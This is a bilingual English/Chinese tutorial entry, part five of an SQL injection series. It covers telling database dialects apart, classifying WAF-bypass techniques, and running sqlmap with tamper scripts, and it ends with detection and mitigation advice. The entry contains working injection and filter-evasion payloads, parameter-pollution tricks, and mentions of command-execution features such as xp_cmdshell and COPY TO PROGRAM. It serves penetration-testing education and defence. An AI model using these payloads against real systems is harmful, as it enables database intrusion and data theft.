---
id: sqli-dialects-and-bypass
title_en: "SQL Injection, Part 5 — Dialects and Getting Past Filters"
title_zh: "SQL 注入（五）：方言差异与绕过过滤器"
summary_en: An injection targets one particular parser, and a filter in front of it is another parser that may disagree. This entry is the dialect reference — what actually differs between MySQL, MSSQL, PostgreSQL, Oracle and SQLite — plus the bypass categories classified by what the filter and the database see differently, and an honest placement of sqlmap.
summary_zh: 注入针对的是某一种具体的解析器，而它前面的过滤器是另一个可能与之意见不一致的解析器。这一篇是方言参考 —— MySQL、MSSQL、PostgreSQL、Oracle、SQLite 之间到底差在哪 —— 加上按"过滤器和数据库看到的东西差在哪"分类的绕过类别，以及 sqlmap 的诚实定位。
tags: [web, sql-injection, waf-bypass, dialects, sqlmap, tamper]
tools: [sqlmap, Burp Suite, nmap, curl, mysql]
attck: [T1190]
platform: [web]
difficulty: intermediate
updated: 2026-10-08
---

<!-- lang:en -->
### There is no such thing as "SQL"

Every payload in this series has been dialect-specific, and the reason is structural: an injection does not target "SQL", it targets **one particular parser** with its own grammar, functions and quirks. `SUBSTRING` exists everywhere but `MID` does not; `||` concatenates in PostgreSQL and means **logical OR** in MySQL by default; Oracle requires `FROM DUAL` for a bare `SELECT`.

That has two consequences for how you work:

1. **Identify the database before writing payloads.** Guessing wastes requests and produces confusing failures — a payload that works on MySQL silently means something else on MSSQL.
2. **The dialect is also the fingerprint.** Differences are not only an obstacle, they are how you find out what you are talking to: a function that exists, a comment form that parses, an error message with a product name in it.

And a third consequence that this entry's second half is about: **a filter in front of the database is yet another parser**, with its own grammar and its own blind spots. Bypassing it is not a list of magic strings, it is the observation that **two parsers looking at the same bytes can disagree** — the same root cause as the encoding entry, applied to SQL.

### Identifying the database

Do this before anything else. The fastest signals, in the order they usually work:

**1. Error messages.** If the application shows database errors, they usually name the product:

| Message fragment | Database |
|---|---|
| `You have an error in your SQL syntax` | MySQL |
| `XPATH syntax error` | MySQL (an XML function) |
| `Unclosed quotation mark after the character string` | MSSQL |
| `Conversion failed when converting` | MSSQL |
| `Incorrect syntax near` | MSSQL |
| `ERROR: syntax error at or near` | PostgreSQL |
| `invalid input syntax for type` | PostgreSQL |
| `ORA-00933: SQL command not properly ended` | Oracle |
| `ORA-01756: quoted string not properly terminated` | Oracle |
| `SQLite3::query(): near "..."` | SQLite |

**2. A function that exists in only one dialect.** This works even with no error output, using a boolean oracle:

```sql
?id=1 AND SLEEP(0)=0-- -                  -- MySQL: true if the function exists
?id=1 AND pg_sleep(0) IS NULL-- -         -- PostgreSQL
?id=1 AND LEN('a')=1-- -                  -- MSSQL (MySQL uses LENGTH)
?id=1 AND LENGTH('a')=1-- -               -- MySQL, PostgreSQL, Oracle, SQLite
?id=1 AND 1=(SELECT 1 FROM DUAL)-- -      -- Oracle only
```

**3. String concatenation**, which is the single most useful discriminator:

```sql
?id=1 AND CONCAT('a','b')='ab'-- -        -- MySQL
?id=1 AND 'a'+'b'='ab'-- -                -- MSSQL ('ab' converts to 0, so this is false there)
?id=1 AND 'a'||'b'='ab'-- -               -- PostgreSQL, Oracle, SQLite (and MySQL only with PIPES_AS_CONCAT)
```

**4. Comment syntax.** `-- ` with a **trailing space** works nearly everywhere; `#` is MySQL; `/* */` works broadly. If `--` alone (no space, no following character) silently breaks the query, you are probably on MySQL where the space is required.

**5. System views.** `information_schema.tables` exists in MySQL, MSSQL and PostgreSQL; Oracle uses `all_tables`; SQLite has only `sqlite_master`.

**6. Version functions** from part 2's table — but you often need the dialect first to call them, which is why 1 to 5 come earlier.

A practical note: **`@@version` works on both MySQL and MSSQL**, which is a common source of misidentification. Check something boolean-specific afterwards.

### The dialect table

This is the reference to keep. Everything here has bitten someone.

| Need | MySQL | MSSQL | PostgreSQL | Oracle | SQLite |
|---|---|---|---|---|---|
| **String concat** | `CONCAT(a,b)`; `\|\|` is OR by default | `a + b` | `a \|\| b` | `a \|\| b` | `a \|\| b` |
| **Substring** | `SUBSTRING`/`SUBSTR`/`MID` | `SUBSTRING` | `SUBSTRING` | `SUBSTR` | `SUBSTR` |
| **Length** | `LENGTH` | `LEN` | `LENGTH`/`CHAR_LENGTH` | `LENGTH` | `LENGTH` |
| **Char code** | `ASCII`/`ORD` | `ASCII`/`UNICODE` | `ASCII` | `ASCII` | `UNICODE` |
| **Comment** | `-- `, `#`, `/* */` | `--`, `/* */` | `--`, `/* */` | `--`, `/* */` | `--`, `/* */` |
| **Delay** | `SLEEP(n)`, `BENCHMARK` | `WAITFOR DELAY '0:0:n'` | `pg_sleep(n)` | `dbms_pipe.receive_message(('a'),n)` | none |
| **Condition** | `IF(c,a,b)`, `CASE` | `IIF(c,a,b)`, `CASE` | `CASE` | `CASE`, `DECODE` | `CASE`, `IIF` |
| **Version** | `version()`, `@@version` | `@@version` | `version()` | `v$version` | `sqlite_version()` |
| **Current DB** | `database()` | `db_name()` | `current_database()` | `ora_database_name` | — |
| **Current user** | `user()` | `system_user` | `current_user` | `user` | — |
| **Paging** | `LIMIT n,m` | `TOP n`, `OFFSET..FETCH` | `LIMIT n OFFSET m` | `ROWNUM` | `LIMIT n OFFSET m` |
| **Aggregate concat** | `GROUP_CONCAT` | `STRING_AGG`, `FOR XML PATH` | `STRING_AGG` | `LISTAGG` | `GROUP_CONCAT` |
| **Identifier quote** | `` `x` `` (or `"x"` with ANSI_QUOTES) | `[x]` or `"x"` | `"x"` | `"x"` | `"x"`, `[x]`, `` `x` `` |
| **Hex literal** | `0x4142`, `X'4142'` | `0x4142` | `E'\\x41'`, `decode()` | `hextoraw('4142')` | `X'4142'` |
| **Type cast** | `CAST(x AS type)` | `CAST`, `CONVERT` | `x::type`, `CAST` | `CAST`, `TO_CHAR`, `TO_NUMBER` | `CAST` |
| **Stacked queries** | API-dependent | Usually yes | Yes | No | API-dependent |

Three rows deserve emphasis because they cause the most confusion:

- **`||` is not concatenation in MySQL by default.** It is logical OR. `'a'||'b'='ab'` evaluates as `'a' OR ('b'='ab')`, which is not what you meant, and the result is a silent wrong answer rather than an error. Use `CONCAT()`, or check whether `PIPES_AS_CONCAT` is set.
- **Oracle needs `FROM DUAL`.** `SELECT 1` alone is a syntax error on Oracle; `SELECT 1 FROM DUAL` is the form.
- **SQLite has no fixed types.** A column declared `INTEGER` will happily hold a string, which means type-based extraction tricks behave differently and `CAST` is rarely needed.

### What each dialect adds

**MySQL.** `information_schema` for everything; `GROUP_CONCAT` for one-request dumps; `@@version` and `@@datadir`; `INTO OUTFILE` for file write (bounded by `secure_file_priv` and the `FILE` privilege); `LOAD_FILE` for file read. Two settings matter for injection specifically: **`sql_mode`**, because `ANSI_QUOTES` changes whether `"` delimits a string or an identifier, and **`NO_BACKSLASH_ESCAPES`**, because it changes whether `\` is an escape character at all — which directly changes what escaping accomplishes. Both are readable through the injection and both change which payloads work.

**MSSQL.** Rich `sys.` catalog views and `INFORMATION_SCHEMA`; `TOP` instead of `LIMIT`; `WAITFOR DELAY` for time; stacking usually available; detailed error messages, which is why MSSQL is often the easiest to exploit when an error is visible; `xp_cmdshell` and `OPENROWSET` for the privileged paths.

**PostgreSQL.** `||` concatenation; `pg_sleep`; `COPY ... TO PROGRAM` for command execution as superuser; `::` casts; `STRING_AGG`; `information_schema`; and `dblink` for outbound connections, which makes it one of the dialects where out-of-band is realistic.

**Oracle.** `FROM DUAL` for computed selects; `ROWNUM` and no `LIMIT`; `LISTAGG`; `all_tables`, `all_tab_columns`, `all_users` rather than `information_schema`; `utl_http` and `utl_inaddr` for outbound; PL/SQL blocks rather than stacked statements; and errors that are terse and often suppressed, which pushes testing toward blind techniques early.

**SQLite.** No `information_schema` — `sqlite_master` instead, where the original `CREATE TABLE` text is stored, including column names; no `SLEEP`, so time-based needs a computational substitute; flexible types; and `execute` versus `executescript` deciding whether stacking is possible.

### Getting past a filter

The framing matters more than the list. A web application firewall, a parameter sanitiser or a home-made regex is **another parser** in front of the database, and it has the same problem the database has: it must decide what the bytes mean, and it may decide differently.

> **Bypassing is not finding a string the filter forgot. It is finding an input where the filter's interpretation and the database's interpretation diverge.**

That makes the categories predictable, and it is the same table as in the encoding entry, applied to SQL:

| Category | What the filter and the database see differently | Examples |
|---|---|---|
| **Encoding** | Which bytes decode to the dangerous characters | URL/double-URL encoding, `%C0%AF`, wide-byte with a multi-byte charset |
| **Case** | Whether the match is case sensitive | `SeLeCt`, `UnIoN`, `aNd` |
| **Whitespace** | What counts as a token separator | `/**/`, `%09`, `%0a`, `%0d`, `+`, parentheses |
| **Comments** | Whether comments are stripped before matching | `UN/**/ION`, `/*!50000UNION*/`, `#` |
| **Equivalents** | Which spellings the filter knows | `MID` for `SUBSTRING`, `&&` for `AND`, `%26%26` |
| **Numeric tricks** | Whether the value is read as written | `1e0` for `1`, `0x31`, `+1`, `1.0`, `.1` |
| **HTTP layer** | What the filter thinks the parameters are | Duplicate parameters, chunked transfer encoding, `Content-Type` changes, multipart bodies |
| **Charset** | Which encoding the filter assumed | GBK/SJIS wide-byte, `Content-Type` charset mismatch |
| **Concatenation** | Where the filter's string handling breaks the payload | Splitting a keyword across a parameter boundary |

Each of these is the **same disagreement** seen from a different angle, which is why a filter that only handles one of them keeps being bypassed. A few are worth a concrete line:

```sql
-- whitespace and comments as separators
1/**/UNION/**/SELECT/**/1,2,3
1+UNION+SELECT+1,2,3
1%0aUNION%0aSELECT%0a1,2,3

-- MySQL version comments execute, and are often not understood by the filter
/*!50000UNION*//*!50000SELECT*/1,2,3

-- equivalent spellings
1&&1=1                         -- MySQL: AND
1%26%261=1                     -- the same, percent-encoded
SUBSTRING(x,1,1)  vs  MID(x,1,1)  vs  SUBSTR(x,1,1)

-- numeric spellings of 1
1e0    0x31    +1    1.0
```

**The HTTP layer is where most filters are weakest**, because it is the layer they understand least. A WAF parses a request into parameters to inspect them, and if its parser disagrees with the application's parser about what the parameters are, the filter can be inspecting a body that the application never uses. The classic cases:

- **Duplicate parameters.** `?id=1&id=1'` — the filter inspects the first, the application may take the last.
- **Chunked transfer encoding.** The body arrives in pieces; a filter that concatenates them differently from the application sees different content.
- **`Content-Type` mismatch.** A body sent as `text/plain` but parsed as JSON by the application; or a multipart boundary crafted so the filter and the parser split the parts differently.
- **Case of the method or headers.** Unusual but occasionally effective against naive normalisation.

**And the honest part**: bypasses are **per-target**, because a filter's rules are a configuration, not a standard. A payload that defeats one WAF is blocked by the next, and the same product with different rules behaves differently. What transfers between targets is not the string, it is the **method**: find where the filter's parser and the application's parser disagree.

### sqlmap, honestly placed

`sqlmap` automates the entire series: detection, dialect fingerprinting, technique selection, extraction. It is genuinely good at it, and there is no reason to do by hand what it does correctly.

```bash
# basic
sqlmap -u "http://target/item?id=1" --batch --dbs

# with session and headers
sqlmap -u "http://target/item?id=1" --cookie="session=abc" --headers="X-Forwarded-For: 1.1.1.1"

# tamper scripts, when a filter is in the way
sqlmap -u "http://target/item?id=1" --tamper=space2comment,randomcase,charencode

# control the noise
sqlmap -u "http://target/item?id=1" --delay=1 --threads=1 --technique=B
```

The **tamper scripts** are worth knowing by name, because each implements one row of the bypass table:

| Tamper | What it changes |
|---|---|
| `space2comment` | Spaces become `/**/` |
| `randomcase` | Keyword case varies: `SeLeCt` |
| `charencode` | URL-encodes characters |
| `apostrophemask` | `'` becomes a fullwidth variant (charset-dependent) |
| `between` | `>` becomes `BETWEEN` |
| `equaltolike` | `=` becomes `LIKE` |
| `modsecurityversioned` | Wraps payloads in MySQL version comments |

**What sqlmap will not tell you**, and why the manual entries in this series still matter:

- **Which step failed.** Wrong column count, no display position, suppressed errors, or a WAF — four different problems with four different next moves. The tool reports failure; the entries here tell you which failure.
- **Whether a technique is safe to run.** `--risk=3` includes payloads that can **modify or delete data**, and `--level=5` extends testing into headers and other inputs. On anything you do not own or have explicit permission to test, that is a real hazard rather than a theoretical one. `--os-shell` uploads files; `--file-write` changes the target's filesystem.
- **Whether the finding is the point.** A dumped credential proves the injection; it does not tell the developer which query to fix or how the data flowed there — the material in parts 1 and 4.

### The order to work in, across the whole series

Putting all five entries into one procedure:

1. **Find an input that reaches a query** and confirm injectability — `'` versus `''` (part 1).
2. **Identify the dialect** — error text, a distinguishing function, or the concat test.
3. **Determine what comes back** — visible results or errors means in-band (part 2); neither means blind (part 3).
4. **Establish what else is possible** — stacking, file access, command execution, and how privileged the database account is (part 4).
5. **When something blocks you**, ask what the filter sees versus what the database sees, and work the categories rather than a payload list (this entry, plus the encoding entry).
6. **Automate once you know the shape** — a tool is fastest when you can tell it what you expect.

**Step 5 is the one that generalises past SQL injection.** Every filter bypass, in every injection class, is a disagreement between two parsers about the same bytes.

### Detection and mitigation

- **For defenders: a WAF is a compensating control, not a fix.** If a WAF is the only thing standing between an attacker and a concatenated query, the correct finding is "the query is injectable" — because every bypass category above is a way past the WAF, and the injection remains. State it that way in a report; "protected by WAF" is not a remediation.
- **Tune the WAF to decode before it matches.** Its rules should apply to the **fully decoded, normalised** value, not to the raw bytes. A rule that matches on raw input is defeated by any of the encoding rows; a rule that matches after decoding is defeated by far fewer. This is the same advice as the encoding entry's, because it is the same problem.
- **Watch the two signals that indicate a bypass, not just an attempt.** A spike in blocked requests means someone is trying; **a blocked request followed by a database error on the same input means something got through**. Correlating WAF logs with database logs is what turns "we have a WAF" into "we know when it fails", and it is the highest-value detection in this entry.
- **Reduce the dialect surface.** Least privilege removes `xp_cmdshell`, `INTO OUTFILE`, `COPY TO PROGRAM` and cross-schema reads; `secure_file_priv` restricts file paths; disabling multi-statement support in the driver removes stacking. Every one of these converts a technique from "possible" to "not available" regardless of whether the filter sees the payload.
- **Keep the logs that make tuning possible.** Full request logging including the raw and decoded forms, WAF decision logs, and database query logs with parameters. Without the database side you cannot tell a blocked attack from a successful one, and without both sides you cannot tell which rule is missing.
- **And keep the ordering straight in your own head.** The WAF, the filtering, the rate limiting and the error suppression are all **cost and detection**. The fix is that the query must not concatenate, and that is what part 1 established and none of the other four changed.

<!-- lang:zh -->
### "SQL"这种东西并不存在

本系列里每一个载荷都是方言特定的，而理由是结构性的：注入针对的不是"SQL"，而是**某一个具体的解析器**，它有自己的语法、函数和怪癖。`SUBSTRING` 到处都有，但 `MID` 不是；`||` 在 PostgreSQL 里是字符串连接，在 MySQL 里默认是**逻辑或**；Oracle 里一个光秃秃的 `SELECT` 必须跟 `FROM DUAL`。

这给你的工作方式带来两个后果：

1. **写载荷之前先确定数据库。** 靠猜会浪费请求、并产生令人费解的失败 —— 一个在 MySQL 上能用的载荷，在 MSSQL 上悄悄变成了别的意思。
2. **方言同时也是指纹。** 差异不只是障碍，它正是你弄清"对面是什么"的方式：某个存在的函数、某种能解析的注释形式、一条带着产品名的错误信息。

还有第三个后果，也就是这一篇后半部分要讲的：**数据库前面的过滤器同样是另一个解析器**，有自己的语法和自己的盲点。绕过它不是一份魔法字符串清单，而是一个观察：**两个解析器看着同一串字节，可以得出不同结论** —— 和编码那篇是同一个根因，只是用在 SQL 上。

### 识别数据库

在做别的事之前先做这个。最快的信号，按通常生效的顺序：

**1. 错误信息。** 如果应用会显示数据库错误，它们通常会说出产品名：

| 信息片段 | 数据库 |
|---|---|
| `You have an error in your SQL syntax` | MySQL |
| `XPATH syntax error` | MySQL（某个 XML 函数） |
| `Unclosed quotation mark after the character string` | MSSQL |
| `Conversion failed when converting` | MSSQL |
| `Incorrect syntax near` | MSSQL |
| `ERROR: syntax error at or near` | PostgreSQL |
| `invalid input syntax for type` | PostgreSQL |
| `ORA-00933: SQL command not properly ended` | Oracle |
| `ORA-01756: quoted string not properly terminated` | Oracle |
| `SQLite3::query(): near "..."` | SQLite |

**2. 只在某一种方言里存在的函数。** 即使没有错误输出也能用，走布尔预言机：

```sql
?id=1 AND SLEEP(0)=0-- -                  -- MySQL：函数存在则为真
?id=1 AND pg_sleep(0) IS NULL-- -         -- PostgreSQL
?id=1 AND LEN('a')=1-- -                  -- MSSQL（MySQL 用 LENGTH）
?id=1 AND LENGTH('a')=1-- -               -- MySQL、PostgreSQL、Oracle、SQLite
?id=1 AND 1=(SELECT 1 FROM DUAL)-- -      -- 只有 Oracle
```

**3. 字符串连接**，这是最好用的单个判别量：

```sql
?id=1 AND CONCAT('a','b')='ab'-- -        -- MySQL
?id=1 AND 'a'+'b'='ab'-- -                -- MSSQL（'ab' 转成 0，所以这里是假）
?id=1 AND 'a'||'b'='ab'-- -               -- PostgreSQL、Oracle、SQLite（MySQL 仅在 PIPES_AS_CONCAT 下）
```

**4. 注释语法。** 带**尾随空格**的 `-- ` 几乎到处都行；`#` 是 MySQL；`/* */` 普遍可用。如果单独一个 `--`（没有空格、后面也没有字符）静默把查询搞坏了，你多半在 MySQL 上 —— 那里这个空格是必需的。

**5. 系统视图。** `information_schema.tables` 在 MySQL、MSSQL、PostgreSQL 里都有；Oracle 用 `all_tables`；SQLite 只有 `sqlite_master`。

**6. 版本函数**（第二篇那张表里的）—— 但你往往需要先知道方言才能调用它们，这就是为什么 1 到 5 排在前面。

一个实用提醒：**`@@version` 在 MySQL 和 MSSQL 上都能用**，这是误判的常见来源。之后再用某个布尔特定的检查确认一下。

### 方言对照表

这是那张该留着的参考表。这里每一条都坑过人。

| 需要什么 | MySQL | MSSQL | PostgreSQL | Oracle | SQLite |
|---|---|---|---|---|---|
| **字符串连接** | `CONCAT(a,b)`；`\|\|` 默认是 OR | `a + b` | `a \|\| b` | `a \|\| b` | `a \|\| b` |
| **取子串** | `SUBSTRING`/`SUBSTR`/`MID` | `SUBSTRING` | `SUBSTRING` | `SUBSTR` | `SUBSTR` |
| **长度** | `LENGTH` | `LEN` | `LENGTH`/`CHAR_LENGTH` | `LENGTH` | `LENGTH` |
| **字符编码** | `ASCII`/`ORD` | `ASCII`/`UNICODE` | `ASCII` | `ASCII` | `UNICODE` |
| **注释** | `-- `、`#`、`/* */` | `--`、`/* */` | `--`、`/* */` | `--`、`/* */` | `--`、`/* */` |
| **延迟** | `SLEEP(n)`、`BENCHMARK` | `WAITFOR DELAY '0:0:n'` | `pg_sleep(n)` | `dbms_pipe.receive_message(('a'),n)` | 无 |
| **条件** | `IF(c,a,b)`、`CASE` | `IIF(c,a,b)`、`CASE` | `CASE` | `CASE`、`DECODE` | `CASE`、`IIF` |
| **版本** | `version()`、`@@version` | `@@version` | `version()` | `v$version` | `sqlite_version()` |
| **当前库** | `database()` | `db_name()` | `current_database()` | `ora_database_name` | —— |
| **当前用户** | `user()` | `system_user` | `current_user` | `user` | —— |
| **分页** | `LIMIT n,m` | `TOP n`、`OFFSET..FETCH` | `LIMIT n OFFSET m` | `ROWNUM` | `LIMIT n OFFSET m` |
| **聚合拼接** | `GROUP_CONCAT` | `STRING_AGG`、`FOR XML PATH` | `STRING_AGG` | `LISTAGG` | `GROUP_CONCAT` |
| **标识符引号** | `` `x` ``（ANSI_QUOTES 下 `"x"`） | `[x]` 或 `"x"` | `"x"` | `"x"` | `"x"`、`[x]`、`` `x` `` |
| **十六进制字面量** | `0x4142`、`X'4142'` | `0x4142` | `E'\\x41'`、`decode()` | `hextoraw('4142')` | `X'4142'` |
| **类型转换** | `CAST(x AS type)` | `CAST`、`CONVERT` | `x::type`、`CAST` | `CAST`、`TO_CHAR`、`TO_NUMBER` | `CAST` |
| **堆叠查询** | 取决于 API | 通常支持 | 支持 | 不支持 | 取决于 API |

有三行值得强调，因为它们造成的混淆最多：

- **`||` 在 MySQL 默认不是连接。** 它是逻辑或。`'a'||'b'='ab'` 会按 `'a' OR ('b'='ab')` 求值 —— 那不是你想要的意思，而且结果是**静默的错误答案**而不是报错。用 `CONCAT()`，或者先查 `PIPES_AS_CONCAT` 是否开启。
- **Oracle 需要 `FROM DUAL`。** 单独一个 `SELECT 1` 在 Oracle 上是语法错误；`SELECT 1 FROM DUAL` 才是那个形式。
- **SQLite 没有固定类型。** 一个声明为 `INTEGER` 的列会很乐意存一个字符串，这意味着基于类型的提取技巧表现不同，而 `CAST` 很少需要。

### 各方言各自多出来的东西

**MySQL。** `information_schema` 描述一切；`GROUP_CONCAT` 一次请求导完；`@@version` 和 `@@datadir`；`INTO OUTFILE` 写文件（受 `secure_file_priv` 和 `FILE` 权限限制）；`LOAD_FILE` 读文件。有两个设置对注入特别要紧：**`sql_mode`**，因为 `ANSI_QUOTES` 会改变 `"` 是界定字符串还是标识符；以及 **`NO_BACKSLASH_ESCAPES`**，因为它改变 `\` 到底是不是转义字符 —— 而这直接改变"转义"能达成什么。两者都能通过注入读到，也都改变哪些载荷可用。

**MSSQL。** 丰富的 `sys.` 目录视图以及 `INFORMATION_SCHEMA`；用 `TOP` 而不是 `LIMIT`；`WAITFOR DELAY` 做时间；堆叠通常可用；错误信息详细 —— 这也是为什么错误可见时 MSSQL 常常最好利用；`xp_cmdshell` 和 `OPENROWSET` 是那些需要权限的路径。

**PostgreSQL。** `||` 连接；`pg_sleep`；超级用户下 `COPY ... TO PROGRAM` 做命令执行；`::` 转换；`STRING_AGG`；`information_schema`；以及 `dblink` 做出站连接 —— 这让它成为带外比较现实的方言之一。

**Oracle。** 计算型查询必须 `FROM DUAL`；`ROWNUM` 且没有 `LIMIT`；`LISTAGG`；用 `all_tables`、`all_tab_columns`、`all_users` 而不是 `information_schema`；`utl_http` 和 `utl_inaddr` 做出站；用 PL/SQL 块而不是堆叠语句；错误简短且常被屏蔽，这就把测试早早推向盲注。

**SQLite。** 没有 `information_schema` —— 改用 `sqlite_master`，那里存着原始的 `CREATE TABLE` 文本，列名都在里面；没有 `SLEEP`，所以时间型需要计算上的替代品；类型宽松；而 `execute` 与 `executescript` 决定了能不能堆叠。

### 绕过过滤器

框架比清单重要。Web 应用防火墙、参数净化器，或者自己写的正则，都是**数据库前面的另一个解析器**，而它面临和数据库一样的问题：它必须判断这些字节是什么意思，而它可能判得不一样。

> **绕过不是找到过滤器忘了的某个字符串，而是找到一个输入，让过滤器的解释和数据库的解释产生分歧。**

这让类别变得可预测，而且它就是编码那篇里的同一张表，用在 SQL 上：

| 类别 | 过滤器和数据库在哪不同 | 例子 |
|---|---|---|
| **编码** | 哪些字节解码成危险字符 | URL/双重 URL 编码、`%C0%AF`、多字节字符集下的宽字节 |
| **大小写** | 匹配是否区分大小写 | `SeLeCt`、`UnIoN`、`aNd` |
| **空白** | 什么算记号分隔符 | `/**/`、`%09`、`%0a`、`%0d`、`+`、括号 |
| **注释** | 匹配前是否剥掉注释 | `UN/**/ION`、`/*!50000UNION*/`、`#` |
| **等价物** | 过滤器认得哪些写法 | 用 `MID` 代替 `SUBSTRING`、用 `&&` 代替 `AND`、`%26%26` |
| **数字花招** | 值是否按字面读 | 用 `1e0` 代替 `1`、`0x31`、`+1`、`1.0`、`.1` |
| **HTTP 层** | 过滤器以为参数是什么 | 重复参数、分块传输、改 `Content-Type`、multipart 请求体 |
| **字符集** | 过滤器假设了哪种编码 | GBK/SJIS 宽字节、`Content-Type` 里的 charset 不一致 |
| **拼接** | 过滤器处理字符串时把载荷切断在哪 | 把一个关键字拆到参数边界两边 |

上面每一条都是**同一个分歧**从不同角度看到的样子，这也解释了为什么只处理其中一条的过滤器会不断被绕过。有几行值得给个具体的样子：

```sql
-- 空白与注释作为分隔符
1/**/UNION/**/SELECT/**/1,2,3
1+UNION+SELECT+1,2,3
1%0aUNION%0aSELECT%0a1,2,3

-- MySQL 的版本注释会执行，而过滤器常常看不懂它
/*!50000UNION*//*!50000SELECT*/1,2,3

-- 等价写法
1&&1=1                         -- MySQL 的 AND
1%26%261=1                     -- 同一个东西，百分号编码
SUBSTRING(x,1,1)  对  MID(x,1,1)  对  SUBSTR(x,1,1)

-- 1 的各种数字写法
1e0    0x31    +1    1.0
```

**HTTP 层是多数过滤器最弱的地方**，因为那是它们理解得最少的层。WAF 会把请求解析成参数以便检查，而如果它的解析器与应用的解析器对"参数是什么"的意见不一致，过滤器可能正在检查一个应用根本不用的请求体。经典情况：

- **重复参数。** `?id=1&id=1'` —— 过滤器检查第一个，应用可能取最后一个。
- **分块传输编码。** 请求体分片到达；一个把分片拼接方式与应用不同的过滤器，看到的内容也不同。
- **`Content-Type` 不一致。** 一个以 `text/plain` 发送、却被应用按 JSON 解析的请求体；或者一个精心构造的 multipart 边界，让过滤器和解析器把各段切得不一样。
- **方法或头的大小写。** 少见，但偶尔对天真的规范化有效。

**还有诚实的那部分**：绕过是**逐目标的**，因为过滤器的规则是配置，不是标准。一个能打穿某款 WAF 的载荷会被下一款拦住，而同一款产品换了规则表现也不同。在目标之间能迁移的不是那个字符串，而是**方法**：找到过滤器的解析器和应用的解析器在哪里产生分歧。

### sqlmap，诚实地定位

`sqlmap` 把整个系列自动化了：探测、方言指纹、选技术、提取。它确实擅长这些，而且没有理由手工去做它能做对的事。

```bash
# 基础
sqlmap -u "http://target/item?id=1" --batch --dbs

# 带会话与请求头
sqlmap -u "http://target/item?id=1" --cookie="session=abc" --headers="X-Forwarded-For: 1.1.1.1"

# 有过滤器挡路时用 tamper 脚本
sqlmap -u "http://target/item?id=1" --tamper=space2comment,randomcase,charencode

# 控制动静
sqlmap -u "http://target/item?id=1" --delay=1 --threads=1 --technique=B
```

**tamper 脚本**值得按名字知道，因为每一个实现的就是绕过表里的一行：

| Tamper | 它改变什么 |
|---|---|
| `space2comment` | 空格变成 `/**/` |
| `randomcase` | 关键字大小写随机：`SeLeCt` |
| `charencode` | 对字符做 URL 编码 |
| `apostrophemask` | `'` 变成全角变体（取决于字符集） |
| `between` | `>` 变成 `BETWEEN` |
| `equaltolike` | `=` 变成 `LIKE` |
| `modsecurityversioned` | 用 MySQL 版本注释把载荷包起来 |

**sqlmap 不会告诉你的事**，也是本系列这些手工篇仍然有意义的理由：

- **是哪一步失败了。** 列数不对、没有显示位、错误被屏蔽、还是有 WAF —— 四个不同的问题，四种不同的下一步。工具报告失败，而这里的篇目告诉你是哪一种失败。
- **某个技术跑起来安不安全。** `--risk=3` 包含**可能修改或删除数据**的载荷，而 `--level=5` 把测试扩展到请求头和其他输入。在任何你不拥有、或没有明确授权测试的东西上，这是实际危险而不是理论危险。`--os-shell` 会上传文件；`--file-write` 会改动目标文件系统。
- **这条发现本身是不是重点。** 导出一份凭据证明了注入存在；它没有告诉开发者该改哪条查询、或者数据是怎么流到那里的 —— 那是第一篇和第四篇的材料。

### 整套系列的工作顺序

把五篇合成一个流程：

1. **找一个真能到达查询的输入**并确认可注入 —— `'` 对 `''`（第一篇）。
2. **识别方言** —— 错误文本、一个有区分度的函数，或者连接测试。
3. **判断什么会回来** —— 有结果回显或报错就是带内（第二篇）；都没有就是盲注（第三篇）。
4. **确定还有什么可能** —— 堆叠、文件访问、命令执行，以及数据库账号有多大权限（第四篇）。
5. **被什么东西挡住时**，问"过滤器看到什么、数据库看到什么"，按类别去做而不是对着一份载荷清单（这一篇，加上编码那篇）。
6. **弄清形状之后再自动化** —— 当你能告诉工具你预期什么时，它最快。

**第 5 步是能推广到 SQL 注入之外的那一步。** 每一个过滤器绕过、在每一个注入类别里，都是两个解析器对同一串字节的意见分歧。

### 检测与缓解

- **给防守方：WAF 是补偿控制，不是修复。** 如果 WAF 是攻击者和一条拼接查询之间的唯一东西，那正确的发现就是"这条查询可注入" —— 因为上面每一个绕过类别都是绕过 WAF 的路，而注入依然在。报告里就这么写；"有 WAF 保护"不是修复措施。
- **把 WAF 调成先解码再匹配。** 它的规则应当作用于**完整解码、规范化之后**的值，而不是原始字节。作用在原始输入上的规则会被编码那一整行里的任何一条打败；解码之后再匹配的规则，能打败它的手段少得多。这和编码那篇的建议一样，因为它是同一个问题。
- **盯那两个表示"绕过成功"而不只是"有人尝试"的信号。** 被拦请求突增，说明有人在试；**一个被拦住的请求之后、同一个输入在数据库侧报错，说明有东西过去了**。把 WAF 日志和数据库日志关联起来，正是把"我们有个 WAF"变成"我们知道自己什么时候失效"的东西，也是这一篇里价值最高的检测。
- **削减方言面。** 最小权限移除 `xp_cmdshell`、`INTO OUTFILE`、`COPY TO PROGRAM` 和跨 schema 读取；`secure_file_priv` 限制文件路径；在驱动里关掉多语句支持就移除了堆叠。每一条都把某个技术从"可能"变成"不可用"，与过滤器有没有看到载荷无关。
- **留下能让调优发生的日志。** 完整的请求日志（含原始与解码两种形式）、WAF 的决策日志，以及带参数的数据库查询日志。没有数据库那一侧，你分不清一次攻击是被拦住了还是成功了；没有两侧，你分不清缺的是哪条规则。
- **在自己脑子里把顺序摆正。** WAF、过滤、限流、错误屏蔽，全都是**成本与检测**。修复是那条查询不得拼接 —— 这是第一篇确立的，而后面四篇没有改变它。
